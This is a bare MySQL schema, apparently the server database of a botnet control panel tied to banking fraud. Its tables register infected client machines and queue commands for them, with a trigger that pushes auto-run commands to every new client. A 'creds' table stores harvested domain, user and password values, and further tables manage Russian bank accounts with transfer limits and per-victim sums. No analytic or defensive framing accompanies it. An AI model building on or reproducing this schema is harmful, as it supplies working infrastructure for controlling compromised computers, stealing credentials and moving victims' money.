--
-- Table structure for table `cli`
--

CREATE TABLE `cli` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `stamp` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' ON UPDATE CURRENT_TIMESTAMP,
  `lastcmd_stamp` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `mid` char(16) CHARACTER SET ascii COLLATE ascii_bin NOT NULL,
  `ip` char(60) CHARACTER SET ascii COLLATE ascii_bin NOT NULL,
  `l_ticks` int(10) unsigned NOT NULL,
  `l_ft` datetime NOT NULL,
  `tz_name` char(64) COLLATE utf8_unicode_ci NOT NULL,
  `tz_bias` int(11) NOT NULL,
  `m_name` char(32) COLLATE utf8_unicode_ci NOT NULL,
  `d_name` char(32) COLLATE utf8_unicode_ci NOT NULL,
  `memo` tinytext COLLATE utf8_unicode_ci NOT NULL,
  `arch` enum('unk','x32','x64') COLLATE utf8_unicode_ci NOT NULL DEFAULT 'unk',
  `v_build` smallint(5) unsigned NOT NULL,
  `c_flags` tinyint(3) unsigned NOT NULL,
  `dummy` tinyint(3) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `mid` (`mid`),
  KEY `stamp` (`stamp`),
  KEY `arch` (`arch`),
  KEY `lastcmd_stamp` (`lastcmd_stamp`),
  KEY `m_name` (`m_name`),
  KEY `d_name` (`d_name`),
  KEY `v_build` (`v_build`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Triggers `cli`
--
DROP TRIGGER IF EXISTS `AutocmdNewclients`;
DELIMITER //
CREATE TRIGGER `AutocmdNewclients` AFTER INSERT ON `cli`
 FOR EACH ROW BEGIN
    DECLARE done INT DEFAULT FALSE;
    DECLARE cmd_id INT;
    DECLARE cur CURSOR FOR SELECT id FROM cmd_params WHERE cmd_params.auto > 0;
    DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;

    OPEN cur;
        ins_loop: LOOP
            FETCH cur INTO cmd_id;
            IF done THEN
                LEAVE ins_loop;
            END IF;
            INSERT INTO cmds_list (target_id, added_stamp, linked_cmd_params) VALUES (NEW.id, NOW(), cmd_id);
        END LOOP;
    CLOSE cur;
END
//
DELIMITER ;

-- --------------------------------------------------------

--
-- Table structure for table `cmds_list`
--

CREATE TABLE `cmds_list` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `target_id` int(10) unsigned NOT NULL,
  `last_stamp` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' ON UPDATE CURRENT_TIMESTAMP,
  `added_stamp` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `is_done` tinyint(1) NOT NULL,
  `linked_cmd_params` int(10) unsigned NOT NULL,
  `answer` mediumblob NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uniq_cmd_check` (`target_id`,`linked_cmd_params`),
  KEY `target_id` (`target_id`),
  KEY `target_id_2` (`target_id`,`last_stamp`),
  KEY `target_id_3` (`target_id`,`is_done`),
  KEY `added_stamp` (`added_stamp`)
) ENGINE=MyISAM  DEFAULT CHARSET=binary;

-- --------------------------------------------------------

--
-- Table structure for table `cmd_params`
--

CREATE TABLE `cmd_params` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `stamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `cmd_code` int(10) unsigned NOT NULL,
  `auto` tinyint(3) unsigned NOT NULL,
  `targ_arch` enum('unk','x32','x64','all') NOT NULL DEFAULT 'unk',
  `params` mediumblob NOT NULL,
  `params_hash` char(40) CHARACTER SET ascii COLLATE ascii_bin NOT NULL,
  `memo` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uniq_record_check` (`cmd_code`,`params_hash`),
  KEY `cmd_code` (`cmd_code`),
  KEY `stamp` (`stamp`),
  KEY `targ_arch` (`targ_arch`),
  KEY `auto` (`auto`)
) ENGINE=MyISAM  DEFAULT CHARSET=binary;

-- --------------------------------------------------------

--
-- Table structure for table `creds`
--

CREATE TABLE `creds` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `src_id` int(10) unsigned NOT NULL,
  `stamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `OriginStampHigh` int(10) unsigned NOT NULL,
  `OriginStampLow` int(10) unsigned NOT NULL,
  `OriginType` tinyint(3) unsigned NOT NULL,
  `AccessLevel` tinyint(3) unsigned NOT NULL,
  `SM` varchar(32) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `D` varchar(32) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `U` varchar(210) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `P` varchar(66) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `SM` (`SM`,`D`,`U`),
  KEY `src_id` (`src_id`),
  KEY `stamp` (`stamp`),
  KEY `OriginType` (`OriginType`),
  KEY `AccessLevel` (`AccessLevel`)
) ENGINE=MyISAM  DEFAULT CHARSET=binary;

-- --------------------------------------------------------

--
-- Table structure for table `lp_last_results`
--

CREATE TABLE `lp_last_results` (
  `id` int(10) unsigned NOT NULL,
  `stamp` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' ON UPDATE CURRENT_TIMESTAMP,
  `res` smallint(5) unsigned NOT NULL,
  `le` int(10) unsigned NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=binary;

-- --------------------------------------------------------

--
-- Table structure for table `q_log`
--

CREATE TABLE `q_log` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `stamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `log_json` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `stamp` (`stamp`),
  FULLTEXT KEY `log` (`log_json`)
) ENGINE=MyISAM  DEFAULT CHARSET=ascii;

-- --------------------------------------------------------

--
-- Table structure for table `t_accs`
--

CREATE TABLE `t_accs` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `memo` varchar(128) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `stamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `b_enabled` tinyint(1) NOT NULL DEFAULT '0',
  `b_gp` tinyint(3) unsigned NOT NULL,
  `rev_id` int(10) unsigned NOT NULL,
  `trans_min` int(10) unsigned NOT NULL,
  `trans_max` int(10) unsigned NOT NULL,
  `max_trans_count` int(10) unsigned NOT NULL,
  `max_trans_sum` int(10) unsigned NOT NULL,
  `trans_count_registered` int(10) unsigned NOT NULL,
  `trans_sum_registered` int(10) unsigned NOT NULL,
  `f_bic` binary(9) NOT NULL,
  `f_corr` binary(20) NOT NULL,
  `f_acc` binary(20) NOT NULL,
  `f_inn` binary(10) NOT NULL,
  `f_kpp` binary(9) NOT NULL,
  `f_name` varchar(128) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `f_acc` (`f_acc`),
  KEY `last_stamp` (`stamp`),
  KEY `b_enabled` (`b_enabled`)
) ENGINE=MyISAM DEFAULT CHARSET=binary;

-- --------------------------------------------------------

--
-- Table structure for table `t_accs_reg`
--

CREATE TABLE `t_accs_reg` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `cli_id` int(10) unsigned NOT NULL,
  `tacc_id` int(10) unsigned NOT NULL,
  `stamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `sum` int(10) unsigned NOT NULL,
  `info` blob NOT NULL,
  `info_hash` char(20) CHARACTER SET ascii COLLATE ascii_bin NOT NULL,
  `dups` int(10) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `info_hash` (`info_hash`),
  KEY `cli_id` (`cli_id`),
  KEY `stamp` (`stamp`),
  KEY `tacc_id` (`tacc_id`)
) ENGINE=MyISAM DEFAULT CHARSET=binary;

-- --------------------------------------------------------

--
-- Table structure for table `t_accs_removed`
--

CREATE TABLE `t_accs_removed` (
  `ta_id` int(10) unsigned NOT NULL,
  PRIMARY KEY (`ta_id`)
) ENGINE=MyISAM DEFAULT CHARSET=binary;

-- --------------------------------------------------------

--
-- Table structure for table `vbuilds_memo`
--

CREATE TABLE `vbuilds_memo` (
  `id` smallint(5) unsigned NOT NULL,
  `memo` tinytext CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `stamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=binary;